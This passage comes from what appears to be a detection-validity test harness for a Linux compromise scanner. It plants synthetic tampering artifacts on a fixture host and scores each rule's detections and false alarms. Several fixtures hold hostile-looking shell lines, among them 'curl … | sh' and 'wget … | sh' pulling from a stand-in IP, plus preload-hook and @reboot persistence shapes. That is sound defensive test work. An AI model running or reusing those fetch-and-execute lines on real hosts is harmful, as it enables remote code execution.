        {"MESSAGE": "Failed password for invalid user admin from 198.51.100.23 port 51023 ssh2",
         "_COMM": "sshd", "__REALTIME_TIMESTAMP": "1730000005000000"}])


# ---- packages ---------------------------------------------------------------------------------
@scenario("apt_source_trusted_yes", "positive", "INSECURE_PACKAGE_SOURCE_SETTING", "T1195")
def _(h: FixtureHost) -> None:
    h.file("/etc/apt/sources.list.d/vendor.list", "deb [trusted=yes] http://198.51.100.9/apt stable main\n")


@scenario("apt_source_signed_by", "benign", "INSECURE_PACKAGE_SOURCE_SETTING")
def _(h: FixtureHost) -> None:
    h.file("/etc/apt/sources.list.d/vendor.sources", "Types: deb\nURIs: https://pkg.example\nSuites: stable\n"
           "Components: main\nSigned-By: /usr/share/keyrings/vendor.gpg\n")


@scenario("dpkg_binary_drift", "positive", "PACKAGE_FILE_DRIFT", "T1554")
def _(h: FixtureHost) -> None:
    h.command_output("dpkg", "??5??????   /usr/bin/sudo\n", "FAILED", 1)


@scenario("dpkg_conffile_changed", "positive", "PACKAGE_CONFFILE_CHANGED")
def _(h: FixtureHost) -> None:
    h.command_output("dpkg", "??5?????? c /etc/ssh/sshd_config\n", "FAILED", 1)


@scenario("dpkg_files_missing", "positive", "PACKAGE_FILES_MISSING")
def _(h: FixtureHost) -> None:
    h.command_output("dpkg", "missing     /lib/modules/6.5.0-old/kernel/fs/x.ko\n", "FAILED", 1)


@scenario("dpkg_unreadable_is_not_drift", "benign", ("PACKAGE_FILE_DRIFT", "PACKAGE_FILES_MISSING", "PACKAGE_CONFFILE_CHANGED"))
def _(h: FixtureHost) -> None:
    h.command_output("dpkg", "missing     /etc/shadow (Permission denied)\n??????????  /usr/bin/su\n", "FAILED", 1)


# ---- packages: rpm / dnf (Fedora, RHEL) ----------------------------------------------------------
def _rpm_host(h: FixtureHost) -> None:
    h.file("/var/lib/rpm/Packages", "")  # presence of the database is what the detector checks
    h.file("/etc/yum.repos.d/fedora.repo", "[fedora]\nname=Fedora\nbaseurl=https://mirror.example/\ngpgcheck=1\n")


@scenario("rpm_binary_drift", "positive", "PACKAGE_FILE_DRIFT", "T1554")
def _(h: FixtureHost) -> None:
    _rpm_host(h)
    h.command_output("rpm", "S.5....T.    /usr/bin/sudo\n", "FAILED", 1)


@scenario("rpm_mode_changed_only", "positive", "PACKAGE_METADATA_DRIFT", "T1548.001")
def _(h: FixtureHost) -> None:
    _rpm_host(h)
    h.command_output("rpm", ".M.......    /usr/bin/su\n", "FAILED", 1)


@scenario("rpm_clean_verify", "benign", ("PACKAGE_FILE_DRIFT", "PACKAGE_METADATA_DRIFT", "PACKAGE_FILES_MISSING"))
def _(h: FixtureHost) -> None:
    _rpm_host(h)
    h.command_output("rpm", "", "COMPLETED", 0)


@scenario("dnf_gpgcheck_off", "positive", "INSECURE_PACKAGE_SOURCE_SETTING", "T1195.002")
def _(h: FixtureHost) -> None:
    _rpm_host(h)
    h.file("/etc/yum.repos.d/vendor.repo", "[vendor]\nname=Vendor\nbaseurl=http://198.51.100.9/rpm\ngpgcheck=0\nsslverify=0\n")


# ---- packages: pacman (Arch) -----------------------------------------------------------------------
def _pacman_host(h: FixtureHost, binary: bytes, conf: bytes = b"[hello]\n") -> None:
    import gzip
    import hashlib
    sha_bin = hashlib.sha256(binary).hexdigest()
    sha_conf = hashlib.sha256(conf).hexdigest()
    mtree = ("#mtree\n/set type=file uid=0 gid=0 mode=644\n"
             "./.BUILDINFO time=1.0 size=1 sha256digest=" + "0" * 64 + "\n"
             "./usr type=dir\n./usr/bin type=dir\n"
             f"./usr/bin/hello mode=755 size={len(binary)} sha256digest={sha_bin}\n"
             "./etc type=dir\n"
             f"./etc/hello.conf size={len(conf)} sha256digest={sha_conf}\n")
    folder = h.root / "var/lib/pacman/local/hello-1.0-1"
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "mtree").write_bytes(gzip.compress(mtree.encode(), mtime=0))
    (folder / "desc").write_text("%NAME%\nhello\n")
    h.file("/etc/pacman.conf", "[options]\nSigLevel = Required DatabaseOptional\n[core]\nInclude = /etc/pacman.d/mirrorlist\n")


@scenario("pacman_binary_drift", "positive", "PACKAGE_FILE_DRIFT", "T1554")
def _(h: FixtureHost) -> None:
    _pacman_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/usr/bin/hello", "#!/bin/sh\ncurl http://198.51.100.9/x | sh\n", 0o755)
    h.file("/etc/hello.conf", "[hello]\n")


@scenario("pacman_conffile_changed", "positive", "PACKAGE_CONFFILE_CHANGED")
def _(h: FixtureHost) -> None:
    _pacman_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
    h.file("/etc/hello.conf", "[hello]\ncolor = yes\n")


@scenario("pacman_binary_missing", "positive", "PACKAGE_FILES_MISSING")
def _(h: FixtureHost) -> None:
    _pacman_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/etc/hello.conf", "[hello]\n")


@scenario("pacman_binary_mode_changed", "positive", "PACKAGE_METADATA_DRIFT", "T1548.001")
def _(h: FixtureHost) -> None:
    _pacman_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o4755)
    h.file("/etc/hello.conf", "[hello]\n")


@scenario("pacman_clean", "benign", ("PACKAGE_FILE_DRIFT", "PACKAGE_CONFFILE_CHANGED", "PACKAGE_FILES_MISSING", "PACKAGE_METADATA_DRIFT"))
def _(h: FixtureHost) -> None:
    _pacman_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
    h.file("/etc/hello.conf", "[hello]\n")


@scenario("pacman_siglevel_never", "positive", "INSECURE_PACKAGE_SOURCE_SETTING", "T1195.002")
def _(h: FixtureHost) -> None:
    _pacman_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
    h.file("/etc/hello.conf", "[hello]\n")
    h.file("/etc/pacman.conf", "[options]\nSigLevel = Never\n")


# ---- packages: apk (Alpine) ---------------------------------------------------------------------------
def _apk_host(h: FixtureHost, binary: bytes) -> None:
    import base64
    import hashlib
    digest = base64.b64encode(hashlib.sha1(binary, usedforsecurity=False).digest()).decode()
    h.file("/lib/apk/db/installed", f"P:hello\nV:1.0-r0\nF:usr/bin\nR:hello\na:0:0:755\nZ:Q1{digest}\n\n")
    h.file("/etc/apk/repositories", "https://dl-cdn.alpinelinux.org/alpine/v3.20/main\n")


@scenario("apk_binary_drift", "positive", "PACKAGE_FILE_DRIFT", "T1554")
def _(h: FixtureHost) -> None:
    _apk_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/usr/bin/hello", "#!/bin/sh\nwget -qO- http://198.51.100.9/x | sh\n", 0o755)


@scenario("apk_clean", "benign", ("PACKAGE_FILE_DRIFT", "PACKAGE_FILES_MISSING", "PACKAGE_METADATA_DRIFT"))
def _(h: FixtureHost) -> None:
    _apk_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)


@scenario("apk_allow_untrusted", "positive", "INSECURE_PACKAGE_SOURCE_SETTING", "T1195.002")
def _(h: FixtureHost) -> None:
    _apk_host(h, b"#!/bin/sh\necho hello\n")
    h.file("/usr/bin/hello", "#!/bin/sh\necho hello\n", 0o755)
    h.file("/etc/apk/repositories", "https://dl-cdn.alpinelinux.org/alpine/v3.20/main --allow-untrusted\n")


# ---- cross-view consistency (rootkit hiding) ---------------------------------------------------------
@scenario("hidden_process_readdir_hook", "positive", "HIDDEN_PROCESS", "T1014",
          notes="emulated: a plain file system cannot answer a lookup it does not list, so the harness "
                "injects the Tgid a hooked procfs would return",
          evidence=lambda fs: any(f["evidence"] == {"how": "LISTING_HIDDEN"} for f in fs))
def _(h: FixtureHost) -> None:
    h.hidden_pids.add(6001)
    h.lookup_only[6001] = 6001


@scenario("hidden_process_lookup_hook", "positive", "HIDDEN_PROCESS", "T1014",
          evidence=lambda fs: any(f["evidence"] == {"how": "LOOKUP_AND_LISTING_HIDDEN"} for f in fs))
def _(h: FixtureHost) -> None:
    h.hidden_pids.add(6002)   # kill() confirms it, procfs has no trace at all


@scenario("thread_ids_are_not_hidden_processes", "benign", "HIDDEN_PROCESS")
def _(h: FixtureHost) -> None:
    for tid in (1301, 1302, 1303):
        (h.proc / "1300" / "task" / str(tid)).mkdir(parents=True, exist_ok=True)


@scenario("hidden_kernel_module", "positive", "HIDDEN_KERNEL_MODULE", "T1014")
def _(h: FixtureHost) -> None:
    h.file("/sys/module/diamorphine/initstate", "live\n")   # live in sysfs, absent from /proc/modules


@scenario("builtin_module_without_initstate", "benign", "HIDDEN_KERNEL_MODULE")
def _(h: FixtureHost) -> None:
    h.file("/sys/module/ext4/parameters/x", "1\n")


@scenario("listener_hidden_from_netlink", "positive", "HIDDEN_LISTENER", "T1014",
          evidence=lambda fs: any(f["evidence"].get("visible_in") == "PROCFS_ONLY" for f in fs))
def _(h: FixtureHost) -> None:
    h.procnet(tcp=[("0100007F", 631), ("00000000", 4444)], udp=[("3600007F", 53)])   # ss (SS_CLEAN) lacks 4444


@scenario("listener_hidden_from_procfs", "positive", "HIDDEN_LISTENER", "T1014",
          evidence=lambda fs: any(f["evidence"].get("visible_in") == "NETLINK_ONLY" for f in fs))
def _(h: FixtureHost) -> None:
    h.command_output("ss", SS_CLEAN + 'tcp LISTEN 0 5 0.0.0.0:31337 0.0.0.0:*\n')


@scenario("listener_in_both_views", "benign", "HIDDEN_LISTENER")
def _(h: FixtureHost) -> None:
    h.listen("tcp", "0.0.0.0", 8080, "python3")
    h.listen("tcp", "[::]", 8081)


@scenario("mount_over_proc_pid", "positive", "PROC_PID_MOUNT_OVERLAY", "T1564.001")
def _(h: FixtureHost) -> None:
    h.file("/proc/self/mountinfo", "22 1 0:21 / /proc rw - proc proc rw\n90 22 0:50 / /proc/6003 rw - tmpfs tmpfs rw\n")


@scenario("binfmt_misc_mount_under_proc", "benign", "PROC_PID_MOUNT_OVERLAY")
def _(h: FixtureHost) -> None:
    h.file("/proc/self/mountinfo", "22 1 0:21 / /proc rw - proc proc rw\n40 22 0:35 / /proc/sys/fs/binfmt_misc rw - autofs systemd-1 rw\n")


# ---- auth without journald -------------------------------------------------------------------------------
@scenario("syslog_file_ssh_login_without_journald", "positive", "REMOTE_AUTHENTICATION_REVIEW", "T1078",
          notes="journalctl absent (Alpine/Void): /var/log/auth.log is the fallback target")
def _(h: FixtureHost) -> None:
    h.outputs.pop("journalctl:auth")
    h.outputs.pop("journalctl:kernel")
    h.file("/var/log/auth.log", "Nov  1 09:12:01 host sshd[900]: Accepted publickey for fixture from 1.1.1.1 port 51022 ssh2\n"
           "Nov  1 09:12:01 host sshd[900]: pam_unix(sshd:session): session opened for user fixture\n")


@scenario("syslog_file_without_logins", "benign", "REMOTE_AUTHENTICATION_REVIEW")
def _(h: FixtureHost) -> None:
    h.outputs.pop("journalctl:auth")
    h.outputs.pop("journalctl:kernel")
    h.file("/var/log/auth.log", "Nov  1 09:12:01 host CRON[1200]: pam_unix(cron:session): session opened for user root\n")


# ---- offline image (mounted root; nothing live is consulted) --------------------------------------------
@scenario("offline_image_preload_and_cron_spool", "positive", ("SYSTEM_LOADER_PRELOAD", "SUSPICIOUS_USER_CRONTAB"),
          "T1574.006", offline=True, notes="crontab comes from the image's spool file, not from a probe")
def _(h: FixtureHost) -> None:
    h.file("/etc/ld.so.preload", "/usr/local/lib/libhook.so\n")
    h.file(f"/var/spool/cron/crontabs/{USER}", "@reboot /dev/shm/.k/keep\n")


@scenario("offline_image_dpkg_drift_from_records", "positive", "PACKAGE_FILE_DRIFT", "T1554", offline=True,
          notes="dpkg --verify would examine the live host; the image's md5sums records are compared with its files")
def _(h: FixtureHost) -> None:
    import hashlib
    h.file("/var/lib/dpkg/info/hello.md5sums", hashlib.md5(b"original\n", usedforsecurity=False).hexdigest() + "  usr/bin/hello\n")
    h.file("/usr/bin/hello", "tampered\n", 0o755)


@scenario("offline_image_live_probes_never_run", "benign", ("EXECUTABLE_IN_VOLATILE_PATH", "HIDDEN_PROCESS", "REMOTE_ACCESS_PORT_EXPOSED"),
          offline=True, notes="the fixture's own /proc and ss text describe a live host and must be ignored for an image")
def _(h: FixtureHost) -> None:
    h.process(4242, "/tmp/.x/payload", name="payload")
    h.hidden_pids.add(6002)
    h.listen("tcp", "0.0.0.0", 22, "sshd")


# ---- runner --------------------------------------------------------------------------------------
def make_audit(host: FixtureHost) -> Audit:
    pw = SimpleNamespace(pw_uid=UID, pw_dir=str(host.home), pw_name=USER)
    euid = 0 if host.scope == "system" else UID
    with patch("falsicore.collectors.pwd.getpwnam", return_value=pw), \
         patch("falsicore.collectors.pwd.getpwuid", return_value=pw), \
         patch("falsicore.collectors.os.geteuid", return_value=euid), \
         patch("falsicore.collectors.os.getuid", return_value=euid):
        audit = Audit(host.scope, target_user=USER, profile=host.profile, root=host.root, offline=host.offline)
    audit.command = host.fake_command  # type: ignore[method-assign]
    audit.pid_probe = host.pid_probe
    # Package attestation needs root ownership on a real host; the fixture names the attested files instead.
    audit.package_attested = lambda path, content: path in host.attested  # type: ignore[method-assign]
    if host.lookup_only:
        original_lookup = audit._tgid_of
        audit._tgid_of = lambda pid: host.lookup_only[pid] if pid in host.lookup_only else original_lookup(pid)  # type: ignore[method-assign]
    return audit


def run_host(host: FixtureHost) -> dict:
    audit = make_audit(host)
    with patch("falsicore.collectors._in_journal_reader_group", return_value=True), \
         patch("falsicore.collectors.PID_RECHECK_DELAY", 0):
        audit.scan()
    summary = report.report_data(audit)
    return {"audit": audit, "findings": report.stable_findings(audit.findings), "coverage": audit.coverage,
            "outcome": summary["outcome"], "rules": sorted({f["rule"] for f in audit.findings})}


def clean_host_result(base: Path, scope: str, offline: bool = False) -> dict:
    host = FixtureHost(base / f"clean-{scope}{'-offline' if offline else ''}", scope=scope, offline=offline)
    result = run_host(host)
    live_only = set(LIVE_ONLY_COLLECTORS) if offline else set()
    incomplete = [c["check"] for c in result["coverage"]
                  if c["check"] in ESSENTIAL and c["check"] not in live_only and c["status"] != "COMPLETED"]
    return {"scope": scope, "mode": "offline" if offline else "live", "outcome": result["outcome"], "findings": result["rules"],
            "coverage": {c["check"]: c["status"] for c in result["coverage"]}, "incomplete_essential": incomplete,
            "passes": result["outcome"] == "NO_COMPROMISE_INDICATORS_OBSERVED" and not result["rules"]}


def run_scenario(base: Path, sc: Scenario, baseline_rules: set[str]) -> dict:
    host = FixtureHost(base / sc.name, scope=sc.scope, offline=sc.offline)
    sc.plant(host)
    result = run_host(host)
    observed = set(result["rules"])
    row = {"name": sc.name, "kind": sc.kind, "scope": sc.scope, "mode": "offline" if sc.offline else "live",
           "rules": sc.rules, "attack": sc.attack,
           "observed": sorted(observed), "outcome": result["outcome"], "notes": sc.notes}
    if sc.kind == "positive":
        missed = sorted(sc.expects - observed)
        matching = [f for f in result["findings"] if f["rule"] in sc.expects]
        evidence_ok = sc.evidence(matching) if sc.evidence else True
        row.update({"detected": not missed and evidence_ok, "missed": missed, "evidence_ok": evidence_ok})
    elif sc.kind == "benign":
        alarms = sorted((observed & sc.expects) | (observed - baseline_rules))
        row.update({"silent": not alarms, "false_alarms": alarms})
    else:
        row.update({"detected": bool(sc.expects & observed)})
    return row


def evaluate() -> dict:
    with tempfile.TemporaryDirectory(prefix="falsicore-validity-") as tmp:
        base = Path(tmp)
        clean = [clean_host_result(base, "user"), clean_host_result(base, "system"), clean_host_result(base, "user", offline=True)]
        baseline_rules = set(clean[0]["findings"]) | set(clean[1]["findings"])
        rows = [run_scenario(base, sc, baseline_rules) for sc in SCENARIOS]
    per_rule: dict[str, dict] = {}
    for rule in sorted(guide.RULES):
        per_rule[rule] = {"positives": 0, "detected": 0, "benign_twins": 0, "false_alarms": 0, "known_gaps": 0}
    for row in rows:
        for rule in row["rules"]:
            entry = per_rule.setdefault(rule, {"positives": 0, "detected": 0, "benign_twins": 0, "false_alarms": 0, "known_gaps": 0})
            if row["kind"] == "positive":
                entry["positives"] += 1
                entry["detected"] += int(row["detected"])
            elif row["kind"] == "benign":
                entry["benign_twins"] += 1
                entry["false_alarms"] += int(not row["silent"])
            else:
                entry["known_gaps"] += 1
    uncovered = sorted(r for r, e in per_rule.items() if e["positives"] == 0)
    missed = [r["name"] for r in rows if r["kind"] == "positive" and not r["detected"]]
    alarms = [r["name"] for r in rows if r["kind"] == "benign" and not r["silent"]]
    return {
        "schema": SCHEMA, "tool_version": __version__,
        "method": "hermetic fixture host (own root, home, /proc; canned probe output); one planted artifact "
                  "shape per scenario; full scan; deep profile",
        "measures": "recall on synthetic artifact shapes; false alarms on benign twins; unplanted-host verdict",
        "does_not_measure": "sensitivity to real malware; shapes not listed; the live host",
        "clean_host": clean,
        "scenario_counts": {"positive": sum(r["kind"] == "positive" for r in rows),
                            "benign": sum(r["kind"] == "benign" for r in rows),
                            "known_gap": sum(r["kind"] == "known_gap" for r in rows)},
        "per_rule": per_rule, "rules_without_positive_scenario": uncovered,
        "missed_positives": missed, "false_alarms": alarms,
        "passes": all(c["passes"] for c in clean) and not missed and not alarms and not uncovered,
        "scenarios": rows,
    }


def markdown(result: dict) -> str:
    lines = [f"# Detection validity — falsicore {result['tool_version']}", "",
             f"Method: {result['method']}.", f"Measures: {result['measures']}. Does not measure: {result['does_not_measure']}.", "",
             "| Clean host | Outcome | Findings | Incomplete essential checks |", "|---|---|---|---|"]
    for c in result["clean_host"]:
        lines.append(f"| {c['scope']} ({c['mode']}) | `{c['outcome']}` | {len(c['findings'])} | {', '.join(c['incomplete_essential']) or '—'} |")
    lines += ["", "| Rule | Positives detected | Benign twins silent | Known gaps |", "|---|---|---|---|"]
    for rule, e in result["per_rule"].items():
        lines.append(f"| `{rule}` | {e['detected']}/{e['positives']} | {e['benign_twins'] - e['false_alarms']}/{e['benign_twins']} | {e['known_gaps']} |")
    lines += ["", f"Missed positives: {result['missed_positives'] or 'none'}. False alarms: {result['false_alarms'] or 'none'}. "
                  f"Rules without a positive scenario: {result['rules_without_positive_scenario'] or 'none'}.",
              "", "| Scenario | Kind | Expected | Observed | Result |", "|---|---|---|---|---|"]
    for r in result["scenarios"]:
        verdict = ("DETECTED" if r.get("detected") else "MISSED") if r["kind"] == "positive" else \
                  ("SILENT" if r.get("silent") else "FALSE ALARM") if r["kind"] == "benign" else \
                  ("DETECTED (gap closed: update the scenario)" if r.get("detected") else "KNOWN GAP")
        lines.append(f"| {r['name']} | {r['kind']} | {', '.join(r['rules'])} | {', '.join(r['observed']) or '—'} | {verdict} |")
    return "\n".join(lines) + "\n"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--json", action="store_true")
    mode.add_argument("--write", action="store_true", help="refresh docs/DETECTION_VALIDITY.json")
    mode.add_argument("--check", action="store_true", help="fail if docs/DETECTION_VALIDITY.json is stale or the harness fails")
    args = parser.parse_args(argv)
    result = evaluate()
    encoded = json.dumps(result, indent=2, sort_keys=True, ensure_ascii=False) + "\n"
    if args.write:
        RESULT_FILE.write_text(encoded)
        print(f"written {RESULT_FILE.relative_to(ROOT)}; passes={result['passes']}")
    elif args.check:
        committed = RESULT_FILE.read_text() if RESULT_FILE.is_file() else ""
        if committed != encoded:
            print("docs/DETECTION_VALIDITY.json is stale: run python3 tools/validity.py --write", file=sys.stderr)
            return 1
        print(f"detection validity current; passes={result['passes']}")
    elif args.json:
        print(encoded, end="")
    else:
        print(markdown(result), end="")
    return 0 if result["passes"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
